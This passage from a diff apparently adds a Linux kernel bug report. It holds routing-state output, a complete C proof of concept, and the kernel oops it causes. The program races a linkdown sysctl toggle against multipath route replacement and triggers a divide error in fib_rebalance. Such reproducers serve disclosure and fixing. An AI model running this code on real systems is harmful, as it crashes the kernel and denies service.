+	nexthop via 10.0.0.20 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.21 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.22 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.23 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.24 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.25 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.26 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.27 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.28 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.29 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.30 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.31 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.32 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.33 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.34 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.35 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.36 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.37 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.38 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.39 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.40 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.41 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.42 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.43 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.44 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.45 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.46 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.47 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.48 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.49 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.50 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.51 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.52 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.53 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.54 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.55 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.56 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.57 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.58 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.59 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.60 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.61 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.62 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.63 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.64 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.65 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.66 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.67 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.68 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.69 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.70 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.71 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.72 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.73 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.74 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.75 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.76 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.77 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.78 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.79 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.80 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.81 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.82 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.83 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.84 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.85 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.86 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.87 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.88 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.89 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.90 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.91 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.92 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.93 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.94 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.95 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.96 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.97 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.98 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.99 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.100 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.101 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.102 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.103 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.104 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.105 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.106 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.107 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.108 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.109 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.110 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.111 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.112 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.113 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.114 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.115 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.116 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.117 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.118 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.119 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.120 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.121 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.122 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.123 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.124 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.125 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.126 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.127 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.128 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.129 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.130 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.131 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.132 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.133 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.134 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.135 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.136 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.137 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.138 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.139 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.140 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.141 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.142 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.143 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.144 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.145 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.146 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.147 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.148 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.149 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.150 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.151 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.152 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.153 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.154 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.155 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.156 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.157 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.158 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.159 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.160 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.161 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.162 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.163 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.164 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.165 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.166 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.167 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.168 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.169 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.170 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.171 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.172 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.173 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.174 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.175 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.176 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.177 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.178 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.179 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.180 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.181 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.182 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.183 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.184 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.185 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.186 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.187 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.188 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.189 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.190 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.191 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.192 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.193 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.194 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.195 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.196 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.197 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.198 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.199 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.200 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.201 dev v0 weight 1 onlink linkdown 
+
+-----END veth/linkdown state-----
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <net/if.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdarg.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
+
+#define DEV0 "v0"
+#define DEV1 "v1"
+#define DEV0_ADDR "10.0.0.1/24"
+#define SYSCTL_PATH "/proc/sys/net/ipv4/conf/" DEV0 "/ignore_routes_with_linkdown"
+
+#define DEFAULT_NH_COUNT 200U
+#define DEFAULT_ON_USEC 200U
+#define DEFAULT_OFF_USEC 50U
+#define DEFAULT_TIMEOUT 30U
+
+#define MAX_MP_BUF 8192
+#define MAX_ROUTE_REQ 16384
+
+static volatile sig_atomic_t stop_flag;
+
+struct config {
+	unsigned int nh_count;
+	unsigned int on_usec;
+	unsigned int off_usec;
+	unsigned int timeout_sec;
+	int route_cpu;
+	int toggle_cpu;
+};
+
+struct route_state {
+	int fd;
+	size_t msg_len;
+	struct nlmsghdr *nlh;
+	uint32_t *dst;
+};
+
+static void die(const char *fmt, ...)
+{
+	va_list ap;
+
+	va_start(ap, fmt);
+	vfprintf(stderr, fmt, ap);
+	va_end(ap);
+	fputc('\n', stderr);
+	exit(EXIT_FAILURE);
+}
+
+static unsigned int env_u32(const char *name, unsigned int def, unsigned int min,
+			       unsigned int max)
+{
+	char *end = NULL;
+	const char *value = getenv(name);
+	unsigned long parsed;
+
+	if (!value || !*value)
+		return def;
+
+	errno = 0;
+	parsed = strtoul(value, &end, 0);
+	if (errno || !end || *end || parsed < min || parsed > max)
+		die("invalid %s value: %s", name, value);
+
+	return (unsigned int)parsed;
+}
+
+static int env_i32(const char *name, int def, int min, int max)
+{
+	char *end = NULL;
+	const char *value = getenv(name);
+	long parsed;
+
+	if (!value || !*value)
+		return def;
+
+	errno = 0;
+	parsed = strtol(value, &end, 0);
+	if (errno || !end || *end || parsed < min || parsed > max)
+		die("invalid %s value: %s", name, value);
+
+	return (int)parsed;
+}
+
+static void load_config(struct config *cfg)
+{
+	memset(cfg, 0, sizeof(*cfg));
+	cfg->nh_count = env_u32("POC_NH_COUNT", DEFAULT_NH_COUNT, 2, 240);
+	cfg->on_usec = env_u32("POC_ON_USEC", DEFAULT_ON_USEC, 1, 1000000);
+	cfg->off_usec = env_u32("POC_OFF_USEC", DEFAULT_OFF_USEC, 1, 1000000);
+	cfg->timeout_sec = env_u32("POC_TIMEOUT", DEFAULT_TIMEOUT, 1, 86400);
+	cfg->route_cpu = env_i32("POC_ROUTE_CPU", 0, 0, 1024);
+	cfg->toggle_cpu = env_i32("POC_TOGGLE_CPU", 1, 0, 1024);
+}
+
+static void run_cmd(const char *fmt, ...)
+{
+	char cmd[512];
+	va_list ap;
+	int rc;
+
+	va_start(ap, fmt);
+	vsnprintf(cmd, sizeof(cmd), fmt, ap);
+	va_end(ap);
+
+	rc = system(cmd);
+	if (rc == -1)
+		die("system(%s) failed: %s", cmd, strerror(errno));
+	if (!WIFEXITED(rc) || WEXITSTATUS(rc) != 0)
+		die("command failed (%d): %s", rc, cmd);
+}
+
+static void set_affinity(int cpu)
+{
+	cpu_set_t set;
+
+	CPU_ZERO(&set);
+	CPU_SET(cpu, &set);
+	if (sched_setaffinity(0, sizeof(set), &set) != 0)
+		fprintf(stderr, "warning: sched_setaffinity(cpu=%d) failed: %s\n",
+			cpu, strerror(errno));
+}
+
+static void spin_usec(unsigned int usec)
+{
+	struct timespec start, now;
+	unsigned long long elapsed;
+
+	if (!usec)
+		return;
+
+	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
+		return;
+
+	for (;;) {
+		if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
+			return;
+
+		elapsed = (unsigned long long)(now.tv_sec - start.tv_sec) * 1000000ULL;
+		elapsed += (unsigned long long)(now.tv_nsec - start.tv_nsec) / 1000ULL;
+		if (elapsed >= usec)
+			return;
+		asm volatile("" ::: "memory");
+	}
+}
+
+static void write_sysctl_value(int fd, char value)
+{
+	char buf[2] = { value, '\n' };
+
+	if (lseek(fd, 0, SEEK_SET) < 0)
+		die("lseek(%s) failed: %s", SYSCTL_PATH, strerror(errno));
+	if (write(fd, buf, sizeof(buf)) != (ssize_t)sizeof(buf))
+		die("write(%s=%c) failed: %s", SYSCTL_PATH, value, strerror(errno));
+}
+
+static int addattr_l(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
+		     const void *data, size_t alen)
+{
+	size_t len = RTA_LENGTH(alen);
+	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
+	struct rtattr *rta;
+
+	if (newlen > maxlen)
+		return -1;
+
+	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
+	rta->rta_type = type;
+	rta->rta_len = len;
+	if (alen)
+		memcpy(RTA_DATA(rta), data, alen);
+	nlh->nlmsg_len = newlen;
+	return 0;
+}
+
+static size_t build_multipath(char *buf, size_t buflen, int ifindex,
+			      unsigned int nh_count)
+{
+	size_t off = 0;
+	unsigned int i;
+
+	for (i = 0; i < nh_count; i++) {
+		size_t nh_start = off;
+		struct rtnexthop *rtnh;
+		struct rtattr *gw;
+		uint32_t gw_addr = htonl(0x0a000000U | (i + 2));
+
+		if (off + RTNH_ALIGN(sizeof(*rtnh)) + RTA_SPACE(sizeof(gw_addr)) > buflen)
+			die("multipath buffer too small");
+
+		rtnh = (struct rtnexthop *)(buf + off);
+		memset(rtnh, 0, sizeof(*rtnh));
+		rtnh->rtnh_ifindex = ifindex;
+		rtnh->rtnh_flags = RTNH_F_ONLINK;
+		off += RTNH_ALIGN(sizeof(*rtnh));
+
+		gw = (struct rtattr *)(buf + off);
+		gw->rta_type = RTA_GATEWAY;
+		gw->rta_len = RTA_LENGTH(sizeof(gw_addr));
+		memcpy(RTA_DATA(gw), &gw_addr, sizeof(gw_addr));
+		off += RTA_ALIGN(gw->rta_len);
+
+		rtnh->rtnh_len = off - nh_start;
+	}
+
+	return off;
+}
+
+static void prepare_devices(void)
+{
+	run_cmd("ip link del " DEV0 " >/dev/null 2>&1 || true");
+	run_cmd("ip link add " DEV0 " type veth peer name " DEV1);
+	/* Keep the peer down so DEV0 stays UP with no carrier. */
+	run_cmd("ip link set " DEV1 " down");
+	run_cmd("ip link set lo up");
+	run_cmd("ip addr add " DEV0_ADDR " dev " DEV0);
+	run_cmd("ip link set " DEV0 " up");
+}
+
+static void prepare_route_state(struct route_state *state, const struct config *cfg)
+{
+	static char req_buf[MAX_ROUTE_REQ];
+	char mp_buf[MAX_MP_BUF];
+	size_t mp_len;
+	int ifindex;
+	struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
+	int sndbuf = 1 << 20;
+
+	memset(state, 0, sizeof(*state));
+
+	ifindex = if_nametoindex(DEV0);
+	if (!ifindex)
+		die("if_nametoindex(" DEV0 ") failed: %s", strerror(errno));
+
+	state->fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
+	if (state->fd < 0)
+		die("socket(NETLINK_ROUTE) failed: %s", strerror(errno));
+
+	setsockopt(state->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+	if (bind(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
+		die("bind(NETLINK_ROUTE) failed: %s", strerror(errno));
+	if (connect(state->fd, (struct sockaddr *)&nladdr, sizeof(nladdr)) != 0)
+		die("connect(NETLINK_ROUTE) failed: %s", strerror(errno));
+
+	state->nlh = (struct nlmsghdr *)req_buf;
+	memset(req_buf, 0, sizeof(req_buf));
+
+	state->nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
+	state->nlh->nlmsg_type = RTM_NEWROUTE;
+	state->nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE;
+
+	{
+		struct rtmsg *rtm = NLMSG_DATA(state->nlh);
+		uint32_t dst = htonl(0xc6336401U);
+		struct rtattr *dst_rta;
+
+		memset(rtm, 0, sizeof(*rtm));
+		rtm->rtm_family = AF_INET;
+		rtm->rtm_dst_len = 32;
+		rtm->rtm_table = RT_TABLE_MAIN;
+		rtm->rtm_protocol = RTPROT_BOOT;
+		rtm->rtm_scope = RT_SCOPE_UNIVERSE;
+		rtm->rtm_type = RTN_UNICAST;
+
+		dst_rta = (struct rtattr *)((char *)state->nlh +
+					   NLMSG_ALIGN(state->nlh->nlmsg_len));
+		if (addattr_l(state->nlh, sizeof(req_buf), RTA_DST, &dst, sizeof(dst)) != 0)
+			die("failed to add RTA_DST");
+		state->dst = (uint32_t *)RTA_DATA(dst_rta);
+	}
+
+	mp_len = build_multipath(mp_buf, sizeof(mp_buf), ifindex, cfg->nh_count);
+	if (addattr_l(state->nlh, sizeof(req_buf), RTA_MULTIPATH, mp_buf, mp_len) != 0)
+		die("failed to add RTA_MULTIPATH");
+
+	state->msg_len = state->nlh->nlmsg_len;
+}
+
+static void signal_stop(int signo)
+{
+	(void)signo;
+	stop_flag = 1;
+}
+
+static void *toggle_thread(void *arg)
+{
+	const struct config *cfg = arg;
+	int fd;
+
+	set_affinity(cfg->toggle_cpu);
+
+	fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
+	if (fd < 0)
+		die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));
+
+	write_sysctl_value(fd, '1');
+	while (!stop_flag) {
+		write_sysctl_value(fd, '1');
+		spin_usec(cfg->on_usec);
+		write_sysctl_value(fd, '0');
+		spin_usec(cfg->off_usec);
+	}
+
+	close(fd);
+	return NULL;
+}
+
+static void *route_thread(void *arg)
+{
+	const struct config *cfg = arg;
+	struct route_state state;
+	uint32_t seq = 1;
+	unsigned long long iters = 0;
+
+	prepare_route_state(&state, cfg);
+	set_affinity(cfg->route_cpu);
+
+	while (!stop_flag) {
+		uint32_t host_dst = 0xc6336400U | ((seq % 250U) + 1U);
+		ssize_t n;
+
+		*state.dst = htonl(host_dst);
+		state.nlh->nlmsg_seq = seq++;
+		n = send(state.fd, state.nlh, state.msg_len, 0);
+		if (n < 0) {
+			if (errno == EINTR || errno == EAGAIN || errno == ENOBUFS)
+				continue;
+			die("send(RTM_NEWROUTE) failed: %s", strerror(errno));
+		}
+
+		iters++;
+		if ((iters & ((1ULL << 20) - 1ULL)) == 0)
+			fprintf(stderr, "route iterations=%llu\n", iters);
+	}
+
+	close(state.fd);
+	return NULL;
+}
+
+int main(void)
+{
+	struct config cfg;
+	pthread_t toggler;
+	pthread_t router;
+
+	load_config(&cfg);
+	signal(SIGINT, signal_stop);
+	signal(SIGTERM, signal_stop);
+	signal(SIGALRM, signal_stop);
+	if (cfg.timeout_sec)
+		alarm(cfg.timeout_sec);
+
+	fprintf(stderr,
+		"nh_count=%u on_usec=%u off_usec=%u route_cpu=%d toggle_cpu=%d timeout=%u\n",
+		cfg.nh_count, cfg.on_usec, cfg.off_usec, cfg.route_cpu,
+		cfg.toggle_cpu, cfg.timeout_sec);
+
+	prepare_devices();
+
+	{
+		int fd = open(SYSCTL_PATH, O_WRONLY | O_CLOEXEC);
+		if (fd < 0)
+			die("open(%s) failed: %s", SYSCTL_PATH, strerror(errno));
+		write_sysctl_value(fd, '1');
+		close(fd);
+	}
+
+	if (pthread_create(&toggler, NULL, toggle_thread, &cfg) != 0)
+		die("pthread_create(toggle_thread) failed");
+	if (pthread_create(&router, NULL, route_thread, &cfg) != 0)
+		die("pthread_create(route_thread) failed");
+
+	pthread_join(router, NULL);
+	stop_flag = 1;
+	pthread_join(toggler, NULL);
+	fprintf(stderr, "completed: worker threads stopped\n");
+	return 0;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[   30.780017] Oops: divide error: 0000 [#1] SMP NOPTI
+[   30.781125] CPU: 0 UID: 1000 PID: 92 Comm: poc Not tainted 7.2.0-rc7-unfixed-24ef02f934ee+ #5 PREEMPT(lazy)
+[   30.783314] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   30.785792] RIP: 0010:fib_rebalance (net/ipv4/fib_semantics.c:884)
+[   30.786815] Code: 78 45 85 db 75 0a 8b 80 38 01 00 00 85 c0 74 0a 83 e2 10 b8 ff ff ff ff 75 97 44 03 51 28 31 d2 49 63 c2 48 c1 e0 1f 4c 01 c8 <49> f7 f0 83 e8 01 e9 7c ff ff ff 80 7a 66 00 74 0d 48 8b 82 80 00
+All code
+========
+   0:	78 45                	js     0x47
+   2:	85 db                	test   %ebx,%ebx
+   4:	75 0a                	jne    0x10
+   6:	8b 80 38 01 00 00    	mov    0x138(%rax),%eax
+   c:	85 c0                	test   %eax,%eax
+   e:	74 0a                	je     0x1a
+  10:	83 e2 10             	and    $0x10,%edx
+  13:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
+  18:	75 97                	jne    0xffffffffffffffb1
+  1a:	44 03 51 28          	add    0x28(%rcx),%r10d
+  1e:	31 d2                	xor    %edx,%edx
+  20:	49 63 c2             	movslq %r10d,%rax
+  23:	48 c1 e0 1f          	shl    $0x1f,%rax
+  27:	4c 01 c8             	add    %r9,%rax
+  2a:*	49 f7 f0             	div    %r8		<-- trapping instruction
+  2d:	83 e8 01             	sub    $0x1,%eax
+  30:	e9 7c ff ff ff       	jmp    0xffffffffffffffb1
+  35:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
+  39:	74 0d                	je     0x48
+  3b:	48                   	rex.W
+  3c:	8b                   	.byte 0x8b
+  3d:	82                   	(bad)
+  3e:	80                   	.byte 0x80
+	...
+
+Code starting with the faulting instruction
+===========================================
+   0:	49 f7 f0             	div    %r8
+   3:	83 e8 01             	sub    $0x1,%eax
+   6:	e9 7c ff ff ff       	jmp    0xffffffffffffff87
+   b:	80 7a 66 00          	cmpb   $0x0,0x66(%rdx)
+   f:	74 0d                	je     0x1e
+  11:	48                   	rex.W
+  12:	8b                   	.byte 0x8b
+  13:	82                   	(bad)
+  14:	80                   	.byte 0x80
+	...
+[   30.790745] RSP: 0018:ffffaa56402639e8 EFLAGS: 00010206
+[   30.791938] RAX: 0000000080000000 RBX: ffff89a8843cd1c0 RCX: ffff89a8843c8080
+[   30.793819] RDX: 0000000000000000 RSI: ffff89a8843c8000 RDI: 0000000000000000
+[   30.795648] RBP: ffff89a882149f80 R08: 0000000000000000 R09: 0000000000000000
+[   30.797199] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000000
+[   30.798837] R13: 00000000000000c8 R14: 0000000000000000 R15: ffff89a8843c8000
+[   30.800623] FS:  00007f77f6b236c0(0000) GS:ffff89a974a69000(0000) knlGS:0000000000000000
+[   30.802429] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   30.803733] CR2: 00000000004cf000 CR3: 00000000022e9005 CR4: 0000000000370ef0
+[   30.805309] Call Trace:
+[   30.805861]  <TASK>
+[   30.806338]  fib_create_info (net/ipv4/fib_semantics.c:1555)
+[   30.807279]  fib_table_insert (net/ipv4/fib_trie.c:1212)
+[   30.808088]  ? __nla_validate (lib/nlattr.c:677)
+[   30.809012]  ? inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
+[   30.810053]  inet_rtm_newroute (net/ipv4/fib_frontend.c:931)
+[   30.810918]  ? __pfx_inet_rtm_newroute (net/ipv4/fib_frontend.c:909)
+[   30.811887]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7076)
+[   30.812874]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4441)
+[   30.813887]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[   30.814731]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[   30.815596]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[   30.816476]  __sys_sendto (net/socket.c:775 (discriminator 1) net/socket.c:790 (discriminator 1) net/socket.c:2252 (discriminator 1))
+[   30.817502]  __x64_sys_sendto (net/socket.c:2259 net/socket.c:2255 net/socket.c:2255)
+[   30.818451]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
+[   30.819244]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[   30.820338] RIP: 0033:0x42196a
+[   30.820926] Code: e0 89 7d e8 89 4d d4 e8 64 f5 01 00 44 8b 55 d4 48 8b 55 d8 45 31 c9 89 c3 48 8b 75 e0 8b 7d e8 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 36 89 df 48 89 45 e8 e8 b3 f5 01 00 48 8b 45
+All code
+========
+   0:	e0 89                	loopne 0xffffffffffffff8b
+   2:	7d e8                	jge    0xffffffffffffffec
